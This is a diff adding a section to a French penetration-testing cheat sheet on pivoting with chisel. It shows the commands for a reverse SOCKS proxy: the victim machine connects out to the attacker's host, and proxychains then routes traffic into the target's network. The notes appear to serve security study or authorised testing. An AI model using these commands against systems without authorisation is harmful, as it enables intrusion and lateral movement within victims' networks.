@@ -28,7 +28,27 @@
     - Le client (*machine victime*) s'y connecte
     - Le client créer une règle de port forwarding vers l'ip remote (ici, il dit au serveur qu'il est possible d'accéder à remote_ip:remote_port en requêtant sur 127.0.0.1:9998)
 
+- **Proxy socks pour accéder à au réseau de la machine cible et à l'ensemble de ses ports notamment** (on prend la place de la machine) :
 
+  - Hôte :
+
+    ```bash
+    $ ./chisel server -p 8000 --reverse
+    ```
+
+  - Cible :
+
+    ```powershell
+    .\chisel.exe client <IP_HOTE>:8000 R:1080:socks
+    ```
+
+  - Hôte :
+
+    ```bash
+    # Mettre la ligne suivante à la fin du fichier /etc/proxychains4
+    # socks5  127.0.0.1 1080
+    $ proxychains <COMMAND>
+    ```
 
 ### 2. SSH
 
